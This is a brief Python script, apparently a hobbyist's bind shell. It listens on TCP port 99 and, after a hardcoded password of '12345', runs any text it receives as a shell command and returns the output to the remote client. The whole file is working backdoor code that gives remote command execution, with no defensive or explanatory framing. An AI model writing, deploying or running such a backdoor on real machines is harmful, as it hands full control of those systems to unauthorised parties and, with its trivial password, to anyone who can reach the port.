#@skycreeds
import socket
import subprocess

host_ip= socket.gethostbyname(socket.gethostname())
port=99
userid=[]
buffer_size=1024*128
in_check=True
out_check=True

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

server.bind((host_ip,port))

server.listen(5)
print("liseting for incoming ",host_ip)

#check password
def check_password(passs):
    if passs=='12345':
        return True

#out loop
while out_check:
    conn,addr=server.accept()
    
    conn.sendall('hai this is server :enter password or exit'.encode())
    passs=conn.recv(buffer_size).decode()
        

    if check_password(passs):
        print("correct passs")
        conn.sendall("correct password  :".encode())
        #in loop
        while in_check:
            
            core_data=conn.recv(buffer_size).decode()

            if len(core_data) > 0:
                #command line process
                cmd = subprocess.Popen(core_data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
                output_bytes = cmd.stdout.read()
                output_str = str(output_bytes, "utf-8")
                if len(output_str)<1:
                    output_str="no output"
                conn.sendall(output_str.encode())
                if core_data=="quit":
                    in_check=False 
                    conn.close()
                   
    else:
        conn.sendall("wrong password".encode())
        conn.close()
    conn.close()
    break


   








